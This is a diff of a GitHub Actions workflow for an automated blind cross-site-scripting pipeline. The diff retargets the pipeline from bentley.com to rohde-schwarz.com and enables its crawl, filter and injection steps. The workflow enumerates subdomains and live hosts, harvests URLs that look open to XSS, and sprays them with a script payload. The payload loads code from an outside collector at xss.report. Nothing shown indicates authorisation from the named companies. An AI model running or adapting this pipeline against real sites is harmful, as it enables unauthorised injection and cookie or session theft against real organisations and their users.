@@ -34,27 +34,19 @@ jobs:
       - name: Run XSS Pipeline
         run: |
           source $GITHUB_ENV
-          subfinder -d bentley.com -all -recursive -silent | tee subs.txt
+          subfinder -d rohde-schwarz.com -all -recursive -silent | tee subs.txt
 
           # Step 2: Probe live hosts
           cat subs.txt | httpx -silent -follow-redirects | tee alive.txt
           
-          cat alive.txt | gau --subs | tee gau_urls.txt
-
-          cat gau_urls.txt | uro | tee clean_urls.txt
-
-          cat clean_urls.txt | gf xss | tee xss_candidates.txt
-
-          cat xss_candidates.txt | bxss -t -p '"><script src=https://xss.report/c/drakon></script>' | tee bxss_output.txt
-
           # Step 3: Crawl for URLs
-          #cat alive.txt | katana -u - -f qurl -d 2 | tee urls.txt
+          cat alive.txt | katana -u - -f qurl -d 2 | tee urls.txt
 
           # Step 4: Filter XSS candidate URLs
-          #cat urls.txt | gf xss | tee xss_candidates.txt
+          cat urls.txt | gf xss | tee xss_candidates.txt
 
           # Step 5: Blind XSS scan
-          #cat xss_candidates.txt | bxss -t -p '"><script src=https://xss.report/c/drakon></script>' | tee bxss_output.txt
+          cat xss_candidates.txt | bxss -t -p '"><script src=https://xss.report/c/drakon></script>' | tee bxss_output.txt
 
           echo "Pipeline completed."
 
